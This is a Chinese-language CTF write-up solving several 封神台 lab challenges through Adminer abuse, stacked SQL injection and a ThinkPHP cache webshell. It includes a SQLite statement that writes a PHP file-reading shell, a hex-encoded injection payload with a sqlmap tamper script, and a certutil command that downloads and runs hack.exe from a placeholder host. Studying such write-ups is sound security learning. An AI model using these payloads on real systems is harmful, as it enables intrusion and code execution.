---
title: 封神台CTF
categories: 赛题wp
---
# 一起下象棋
robots.txt发现jsfuck，解密出flag

[地址](http://vgtres-b924.aqlab.cn/easy_web/)

<!--more-->

# 靶场B
根据公告flag文件在index.php存在一个特殊的数据库连接程序 `/adminer/` 可以尝试利用搭建恶意mysql服务读取文件

[MySQL 服务端恶意读取客户端任意文件漏洞](https://cloud.tencent.com/developer/article/1818089)

exp:[Rogue MySql Server](https://github.com/Gifts/Rogue-MySql-Server)

根据页面报错修改读取文件为 C:\phpstudy_pr0\WWW\index.php，并`赋予777权限`

回到页面进行连接

![](https://img-blog.csdnimg.cn/e5b59f1154994095b357ac4509be4ec8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
查看mysql.log
![](https://img-blog.csdnimg.cn/f227cd60f19147e6a6b4177ae52080ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
解法二：
点击系统，选择SQLite3然后直接点击登录，即可登录进管理界面
![](https://img-blog.csdnimg.cn/e03a81de1b324a9694cb55b54710ed07.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
执行sql语句：
![](https://img-blog.csdnimg.cn/75ee7f76cf4d4a38b8b00fa842f65975.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
```
ATTACH DATABASE 'flag111.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?php echo file_get_contents("../index.php")?>');
```
![](https://img-blog.csdnimg.cn/d40d372de0da4f52959bf022a187430e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
获取webshell后蚁剑连接，进行提权，没尝试，应该可以利用cs插件进行提权，wp是通过
`certutil -urlcache -split -f http://xxxx/hack.exe hack.exe` 进行下载运行 

# SQL注入
- 预编译
- 过滤select
- 堆叠注入

![](https://img-blog.csdnimg.cn/353a45046d804e8bb301fdc49f41634b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

这关过滤了 `select` 关键字，并且使用了预编译，那么也就意味着我们构造的payload中不能出现 `select` 和 `单双引号`，后面的问题好解决，用十六进制编码就可以绕过，但是过滤了select的话就得想其他办法来绕过了


 如果说这个地方存在堆叠注入,那么我们可以可以采用下面的payload来进行绕过
 ```
-- @x=后面的是字符串，那么也就是说我们可以用十六进制进行替换
;set @x="select sleep(10)"; 
prepare a from @x;
EXECUTE a;
	
-- 处理好后的语句也就是这样
;set @x=0x73656c65637420736c65657028313029;
prepare a from @x;
EXECUTE a;
 ```
 其实想知道这里是否存在堆叠注入很简单，直接把这个payload放到靶场中运行一下就知道了
 
 如果有小伙伴就是想知道怎么判断这里他是否存在堆叠注入，其实也有办法
 
 我们传参 `?id=1a`,看他是否报错，如下图，他报错了说明了数据没有被强转


然后我们把a改为; 传参`?id=1;`,它却没有报错，说明;没有被带入查询，而是解析了(;在sql中表示一串sql语句的结束)

![](https://img-blog.csdnimg.cn/023b1c788af04f14a1298842e3f9e787.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
那么这时候就很大概率确定它存在堆叠注入，外加上面有说这里用了PDO，PDO在没有经过特殊配置的情况下是可以一次执行多条SQL语句的

 那么我们就可以利用上面给出的payload来编写sqlmap的绕过脚本
 
0xduidie.py
```python
#!/usr/bin/env python
import sys
import string

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

def dependencies():
	pass

def tamper(payload, **kwargs):
	payload = 'select 1'+payload
	payload = payload.encode().hex()
	payload = '1;set @x=0x'+payload+';prepare a from @x;EXECUTE a;'
	return payload
```

# 靶场A
一个cms，提示：

>Thinkphp缓存拿webshell，在发帖的地方。核心在于计算，要看得懂源码（也有损招，本地搭建的网站缓存文件名和线上相同。因为算法一致。本地发个帖，知道你的贴对应的缓存名，线上也能试出来）

本地搭建后发帖然后，去找缓存文件

一个帖子会多出来7个文件
![](https://img-blog.csdnimg.cn/18632bf5e9f141568264a705ec68ef62.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
发现其中一个就是我们写入的帖子内容：
![](https://img-blog.csdnimg.cn/4fbd6a08e30a4650936393b8f29bf3f7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
看到内容是`<p></p>`包裹的，尝试直接写入，果然进行了转义
![](https://img-blog.csdnimg.cn/a62437adccf14f1686f42498fbd3cafd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
但是在插入html源码时发现是可以写入
![](https://img-blog.csdnimg.cn/4b3337ee105340c6bf553b84165d109e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center)
![](https://img-blog.csdnimg.cn/e8b967879a234404b546fda07c2e71b8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
尝试访问：
![](https://img-blog.csdnimg.cn/88e59c3438684ba192f85d338ec8fcf2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
再次尝试：
![](https://img-blog.csdnimg.cn/c83a187065704dfe9dd438acabb41806.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_13,color_FFFFFF,t_70,g_se,x_16#pic_center)
![](https://img-blog.csdnimg.cn/e58405d8c630452bb6ba1afe94331ce5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
![](https://img-blog.csdnimg.cn/5157a651b0244de1b9539c441ea8398c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
但是缓存文件的名字是怎么来的？

看着缓存文件名字像md5，解出来一个，确定是md5加密类型，明文是什么？
在文件中找到可疑地方
![](https://img-blog.csdnimg.cn/1b91471f912c414690b16d36f43b8134.png#pic_center)
尝试进行构造`post_data_[tid]`的md5是否和缓存文件名相同
![](https://img-blog.csdnimg.cn/ec567b8ec4ba42128d456f6a1fdf3164.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

